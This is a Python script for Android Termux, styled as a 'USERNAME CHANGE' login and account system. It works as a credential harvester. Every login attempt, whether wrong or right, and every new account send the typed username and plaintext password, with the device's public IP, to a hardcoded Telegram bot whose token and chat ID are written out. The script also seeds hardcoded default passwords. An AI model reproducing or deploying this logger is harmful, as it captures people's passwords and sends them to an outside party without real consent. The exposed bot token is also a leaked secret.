import os
import sys
import json
import hashlib
import requests
from datetime import datetime
import time

# Add color support for Termux
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = BLUE = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = RESET_ALL = ''

class PasswordLoggerSystem:
    def __init__(self):
        # Telegram bot configuration
        self.TELEGRAM_TOKEN = "8193774764:AAECS-EV5eJNhKypbsfIP2t43XGOSC36dWA"
        self.CHAT_ID = "7177443691"
        self.telegram_url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendMessage"
        
        # Local files
        self.log_file = "password_logs.txt"
        self.user_file = "users.json"
        
        # Initialize user database
        self.users_db = self._load_users()
    
    def _load_users(self):
        """Load user database from file"""
        default_users = {
            "admin": {"password": self._hash_password("Admin123!"), "role": "admin"},
            "user1": {"password": self._hash_password("Password123"), "role": "user"},
            "test": {"password": self._hash_password("test123"), "role": "test"}
        }
        
        if os.path.exists(self.user_file):
            try:
                with open(self.user_file, 'r') as f:
                    return json.load(f)
            except:
                return default_users
        return default_users
    
    def _save_users(self):
        """Save user database to file"""
        with open(self.user_file, 'w') as f:
            json.dump(self.users_db, f, indent=4)
    
    def _hash_password(self, password):
        """Hash password for storage"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    def _get_ip_info(self):
        """Get device IP information"""
        try:
            # Try multiple methods to get IP
            ip_commands = [
                'curl -s ifconfig.me',
                'curl -s icanhazip.com',
                'curl -s ipinfo.io/ip'
            ]
            
            for cmd in ip_commands:
                try:
                    result = os.popen(cmd).read().strip()
                    if result and len(result.split('.')) == 4:
                        return result
                except:
                    continue
            
            return "Local Device"
        except:
            return "Unknown"
    
    def _send_password_to_telegram(self, username, password, status, attempt_info=""):
        """Send username and password directly to Telegram"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip_address = self._get_ip_info()
            
            # Create detailed message with password
            message = f"""
🔓 PASSWORD LOGGER ALERT
═══════════════════════════
📋 LOGIN ATTEMPT DETAILS:
├─ 👤 Username: {username}
├─ 🔑 Password: {password}
├─ 📍 IP Address: {ip_address}
├─ 🕒 Time: {timestamp}
├─ 📱 Device: Android Termux
├─ 🔄 Status: {status}
└─ 📝 Info: {attempt_info}
═══════════════════════════
"""
            
            payload = {
                'chat_id': self.CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(self.telegram_url, json=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            self._log_local(f"Telegram Error: {str(e)}")
            return False
    
    def _log_local(self, message):
        """Log to local file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry)
        
        print(f"{Fore.YELLOW}[LOG]{Fore.RESET} {message}")
    
    def _clear_screen(self):
        """Clear terminal screen"""
        os.system('clear')
    
    def _print_username_change_logo(self):
        """Print USERNAME CHANGE logo in blue"""
        logo = f"""
{Fore.BLUE}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║    ██╗   ██╗███████╗███████╗██████╗ ███╗   ██╗ █████╗ ███╗   ███╗███████╗║
║    ██║   ██║██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗████╗ ████║██╔════╝║
║    ██║   ██║███████╗█████╗  ██████╔╝██╔██╗ ██║███████║██╔████╔██║█████╗  ║
║    ██║   ██║╚════██║██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝  ║
║    ╚██████╔╝███████║███████╗██║  ██║██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗║
║     ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝║
║                                                                          ║
║    ╔════════════════════════════════════════════════════════════════╗    ║
║    ║                     ██████╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ ███████╗║    ║
║    ║                    ██╔════╝██║  ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝║    ║
║    ║                    ██║     ███████║███████║██╔██╗ ██║██║  ███╗█████╗  ║    ║
║    ║                    ██║     ██╔══██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ║    ║
║    ║                    ╚██████╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝███████╗║    ║
║    ║                     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝║    ║
║    ╚════════════════════════════════════════════════════════════════╝    ║
║                                                                          ║
║                         PASSWORD LOGGER SYSTEM                           ║
╚══════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(logo)
    
    def _print_header(self):
        """Print application header"""
        self._clear_screen()
        self._print_username_change_logo()
    
    def show_menu(self):
        """Display main menu"""
        while True:
            self._print_header()
            print(f"{Fore.CYAN}📋 Main Menu:{Fore.RESET}")
            print(f"{Fore.BLUE}╔══════════════════════════════════════════════╗{Fore.RESET}")
            print(f"{Fore.BLUE}║{Fore.RESET} 1. 🔐 Login to System                     {Fore.BLUE}║{Fore.RESET}")
            print(f"{Fore.BLUE}║{Fore.RESET} 2. 📝 Create New Account                 {Fore.BLUE}║{Fore.RESET}")
            print(f"{Fore.BLUE}║{Fore.RESET} 3. 🔄 Change Username                    {Fore.BLUE}║{Fore.RESET}")
            print(f"{Fore.BLUE}║{Fore.RESET} 4. 📊 View Login History                 {Fore.BLUE}║{Fore.RESET}")
            print(f"{Fore.BLUE}║{Fore.RESET} 5. ℹ️  System Info                        {Fore.BLUE}║{Fore.RESET}")
            print(f"{Fore.BLUE}║{Fore.RESET} 6. 📡 Test Telegram Connection           {Fore.BLUE}║{Fore.RESET}")
            print(f"{Fore.BLUE}║{Fore.RESET} 0. 🚪 Exit                              {Fore.BLUE}║{Fore.RESET}")
            print(f"{Fore.BLUE}╚══════════════════════════════════════════════╝{Fore.RESET}")
            
            choice = input(f"\n{Fore.GREEN}👉 Select option: {Fore.RESET}").strip()
            
            if choice == "1":
                self.login_attempt()
            elif choice == "2":
                self.create_account()
            elif choice == "3":
                self.change_username()
            elif choice == "4":
                self.view_history()
            elif choice == "5":
                self.system_info()
            elif choice == "6":
                self.test_telegram()
            elif choice == "0":
                print(f"\n{Fore.GREEN}🚪 Exiting system...{Fore.RESET}")
                break
            else:
                print(f"\n{Fore.RED}❌ Invalid option!{Fore.RESET}")
                input("Press Enter to continue...")
    
    def login_attempt(self):
        """Handle login attempts"""
        self._print_header()
        print(f"{Fore.CYAN}🔐 Login Panel{Fore.RESET}\n")
        
        max_attempts = 3
        
        for attempt in range(1, max_attempts + 1):
            print(f"{Fore.YELLOW}Attempt {attempt} of {max_attempts}{Fore.RESET}\n")
            
            # Get credentials
            username = input(f"{Fore.CYAN}👤 Enter Username: {Fore.RESET}").strip()
            
            # Get password (visible for demonstration)
            print(f"{Fore.YELLOW}Note: Password will be visible for demonstration{Fore.RESET}")
            password = input(f"{Fore.CYAN}🔑 Enter Password: {Fore.RESET}")
            
            # Send password immediately to Telegram
            telegram_sent = self._send_password_to_telegram(
                username=username,
                password=password,
                status="LOGIN ATTEMPT",
                attempt_info=f"Attempt {attempt}/{max_attempts}"
            )
            
            # Check credentials
            if username in self.users_db:
                hashed_input = self._hash_password(password)
                stored_hash = self.users_db[username].get("password", "")
                
                if hashed_input == stored_hash:
                    # Successful login
                    self._send_password_to_telegram(
                        username=username,
                        password=password,
                        status="✅ LOGIN SUCCESSFUL",
                        attempt_info="Correct credentials"
                    )
                    
                    self._log_local(f"SUCCESS: User '{username}' logged in")
                    
                    self._print_header()
                    print(f"{Fore.GREEN}{'✓'*20}{Fore.RESET}")
                    print(f"{Fore.GREEN}✅ Login Successful!{Fore.RESET}")
                    print(f"{Fore.GREEN}👋 Welcome, {username}!{Fore.RESET}")
                    print(f"{Fore.GREEN}{'✓'*20}{Fore.RESET}")
                    
                    if telegram_sent:
                        print(f"{Fore.CYAN}📨 Password sent to Telegram{Fore.RESET}")
                    
                    # Show user role
                    role = self.users_db[username].get("role", "user")
                    print(f"{Fore.YELLOW}🎭 Role: {role}{Fore.RESET}")
                    
                    input("\nPress Enter to continue...")
                    return True
                else:
                    # Wrong password
                    self._send_password_to_telegram(
                        username=username,
                        password=password,
                        status="❌ WRONG PASSWORD",
                        attempt_info=f"Incorrect password attempt"
                    )
                    
                    self._log_local(f"FAILED: Wrong password for '{username}'")
                    print(f"\n{Fore.RED}❌ Incorrect password!{Fore.RESET}")
            else:
                # User doesn't exist
                self._send_password_to_telegram(
                    username=username,
                    password=password,
                    status="❌ USER NOT FOUND",
                    attempt_info="Username does not exist"
                )
                
                self._log_local(f"FAILED: Unknown user '{username}'")
                print(f"\n{Fore.RED}❌ User not found!{Fore.RESET}")
            
            # Continue or exit
            if attempt < max_attempts:
                print(f"{Fore.YELLOW}↩️ Please try again...{Fore.RESET}")
                input("Press Enter to continue...")
                self._print_header()
                print(f"{Fore.CYAN}🔐 Login Panel{Fore.RESET}\n")
            else:
                print(f"\n{Fore.RED}⛔ Maximum attempts reached!{Fore.RESET}")
                self._log_local(f"BLOCKED: Too many attempts for '{username}'")
                input("Press Enter to continue...")
                return False
        
        return False
    
    def create_account(self):
        """Create new user account"""
        self._print_header()
        print(f"{Fore.CYAN}📝 Create New Account{Fore.RESET}\n")
        
        username = input(f"{Fore.CYAN}👤 Choose Username: {Fore.RESET}").strip()
        
        if username in self.users_db:
            print(f"\n{Fore.RED}❌ Username already exists!{Fore.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Fore.YELLOW}📝 Creating account for: {username}{Fore.RESET}")
        print(f"{Fore.RED}⚠️  WARNING: Password will be sent to Telegram!{Fore.RESET}")
        
        password = input(f"{Fore.CYAN}🔑 Choose Password: {Fore.RESET}")
        confirm = input(f"{Fore.CYAN}🔒 Confirm Password: {Fore.RESET}")
        
        if password != confirm:
            print(f"\n{Fore.RED}❌ Passwords do not match!{Fore.RESET}")
            input("Press Enter to continue...")
            return
        
        # Send password to Telegram
        self._send_password_to_telegram(
            username=username,
            password=password,
            status="📝 NEW ACCOUNT CREATED",
            attempt_info="User registration"
        )
        
        # Save user
        self.users_db[username] = {
            "password": self._hash_password(password),
            "role": "user",
            "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self._save_users()
        self._log_local(f"NEW_USER: Account created for '{username}'")
        
        print(f"\n{Fore.GREEN}✅ Account created successfully!{Fore.RESET}")
        print(f"{Fore.CYAN}👤 Username: {username}{Fore.RESET}")
        print(f"{Fore.RED}📨 Password has been logged{Fore.RESET}")
        
        input("\nPress Enter to continue...")
    
    def change_username(self):
        """Change username feature"""
        self._print_header()
        print(f"{Fore.CYAN}🔄 Change Username{Fore.RESET}\n")
        
        current_username = input(f"{Fore.CYAN}👤 Enter current username: {Fore.RESET}").strip()
        
        if current_username not in self.users_db:
            print(f"\n{Fore.RED}❌ Username not found!{Fore.RESET}")
            input("Press Enter to continue...")
            return
        
        # Verify password
        password = input(f"{Fore.CYAN}🔑 Enter password for verification: {Fore.RESET}")
        hashed_input = self._hash_password(password)
        
        if hashed_input != self.users_db[current_username]["password"]:
            print(f"\n{Fore.RED}❌ Incorrect password!{Fore.RESET}")
            input("Press Enter to continue...")
            return
        
        # Get new username
        new_username = input(f"{Fore.CYAN}👤 Enter new username: {Fore.RESET}").strip()
        
        if new_username in self.users_db:
            print(f"\n{Fore.RED}❌ New username already exists!{Fore.RESET}")
            input("Press Enter to continue...")
            return
        
        # Transfer user data to new username
        user_data = self.users_db[current_username].copy()
        user_data["last_modified"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Add to new username
        self.users_db[new_username] = user_data
        
        # Remove old username
        del self.users_db[current_username]
        
        # Save changes
        self._save_users()
        
        # Log the change
        self._log_local(f"USERNAME_CHANGE: '{current_username}' changed to '{new_username}'")
        
        # Send to Telegram
        self._send_password_to_telegram(
            username=current_username,
            password=f"Username changed to: {new_username}",
            status="🔄 USERNAME CHANGED",
            attempt_info=f"Old: {current_username}, New: {new_username}"
        )
        
        print(f"\n{Fore.GREEN}✅ Username changed successfully!{Fore.RESET}")
        print(f"{Fore.YELLOW}🔄 {current_username} → {new_username}{Fore.RESET}")
        print(f"{Fore.CYAN}📨 Change notification sent to Telegram{Fore.RESET}")
        
        input("\nPress Enter to continue...")
    
    def view_history(self):
        """View login history"""
        self._print_header()
        print(f"{Fore.CYAN}📊 Login History{Fore.RESET}\n")
        
        if os.path.exists(self.log_file):
            with open(self.log_file, 'r', encoding='utf-8') as f:
                logs = f.readlines()
                
            if logs:
                print(f"{Fore.YELLOW}📜 Last 20 login attempts:{Fore.RESET}\n")
                for log in logs[-20:]:
                    print(f"{Fore.CYAN}📝 {log.strip()}{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}📭 No login history found{Fore.RESET}")
        else:
            print(f"{Fore.YELLOW}📭 Log file not found{Fore.RESET}")
        
        input("\nPress Enter to continue...")
    
    def system_info(self):
        """Display system information"""
        self._print_header()
        print(f"{Fore.CYAN}ℹ️  System Information{Fore.RESET}\n")
        
        print(f"{Fore.GREEN}📡 Telegram Bot:{Fore.RESET}")
        print(f"  🔑 Token: {self.TELEGRAM_TOKEN[:15]}...")
        print(f"  💬 Chat ID: {self.CHAT_ID}")
        
        print(f"\n{Fore.GREEN}📁 Files:{Fore.RESET}")
        print(f"  📝 Log File: {self.log_file}")
        print(f"  👥 User File: {self.user_file}")
        
        print(f"\n{Fore.GREEN}📊 Statistics:{Fore.RESET}")
        print(f"  👥 Total Users: {len(self.users_db)}")
        
        if os.path.exists(self.log_file):
            with open(self.log_file, 'r') as f:
                lines = len(f.readlines())
            print(f"  📝 Total Log Entries: {lines}")
        
        print(f"\n{Fore.GREEN}🌐 Current IP:{Fore.RESET}")
        print(f"  📍 {self._get_ip_info()}")
        
        print(f"\n{Fore.GREEN}⏰ Time:{Fore.RESET}")
        print(f"  🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n{Fore.GREEN}🔄 Username Change Feature:{Fore.RESET}")
        print(f"  ✅ Available: Yes")
        print(f"  🔒 Secure: Password verification required")
        
        input("\nPress Enter to continue...")
    
    def test_telegram(self):
        """Test Telegram connection"""
        self._print_header()
        print(f"{Fore.CYAN}📡 Test Telegram Connection{Fore.RESET}\n")
        
        test_password = "TestPassword123"
        
        print(f"{Fore.YELLOW}📤 Sending test message...{Fore.RESET}")
        
        success = self._send_password_to_telegram(
            username="TEST_USER",
            password=test_password,
            status="🔧 TEST MESSAGE",
            attempt_info="Connection test"
        )
        
        if success:
            print(f"\n{Fore.GREEN}✅ Test message sent successfully!{Fore.RESET}")
            print(f"{Fore.YELLOW}📱 Check your Telegram bot{Fore.RESET}")
            print(f"{Fore.CYAN}👤 Username: TEST_USER{Fore.RESET}")
            print(f"{Fore.CYAN}🔑 Password: {test_password}{Fore.RESET}")
        else:
            print(f"\n{Fore.RED}❌ Failed to send test message{Fore.RESET}")
            print(f"{Fore.YELLOW}🔧 Check your internet connection and bot settings{Fore.RESET}")
        
        input("\nPress Enter to continue...")

def main():
    """Main function"""
    try:
        # Check for required packages
        try:
            import requests
            import colorama
        except ImportError:
            print("Installing required packages...")
            os.system("pkg install python -y")
            os.system("pip install requests colorama")
        
        # Create system instance
        system = PasswordLoggerSystem()
        
        system.show_menu()
    
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}⏹️  System interrupted{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {str(e)}{Fore.RESET}")

if __name__ == "__main__":
    main()
